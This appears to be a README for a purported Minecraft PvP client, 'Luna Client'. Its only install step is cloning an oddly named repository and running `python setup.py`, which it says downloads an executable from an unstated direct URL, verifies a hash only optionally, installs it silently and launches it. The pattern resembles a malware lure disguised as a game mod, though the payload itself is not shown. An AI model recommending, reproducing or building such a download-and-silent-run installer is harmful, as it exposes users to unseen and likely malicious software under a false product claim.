Luna Client — lightweight Minecraft PvP client with FPS boost and built-in mods.

> Open-source Minecraft client focused on performance and PvP. Compatible with all major Minecraft versions and servers.

## Features

- FPS boost and memory optimization
- Built-in mods (toggle sneak, FPS counter, keystrokes)
- Works on all Minecraft versions 1.7-1.21
- Easy install via `setup.py` — downloads and launches automatically
- No manual configuration required
- Works on Windows 10 / 11

## Installation

```bash
git clone https://github.com/overlapcockatooready/luna-client-cyber-98.git
cd luna-client-cyber-98
```

## Usage

```bash
python setup.py
```

`setup.py` will:

1. Download the official installer (`.exe` or `.msi`) from a direct URL.
2. Verify the SHA-256 hash (if provided).
3. Run a silent install.
4. Launch the application.

## Requirements

- Windows 10 or later
- Python 3.10+
- Internet connection
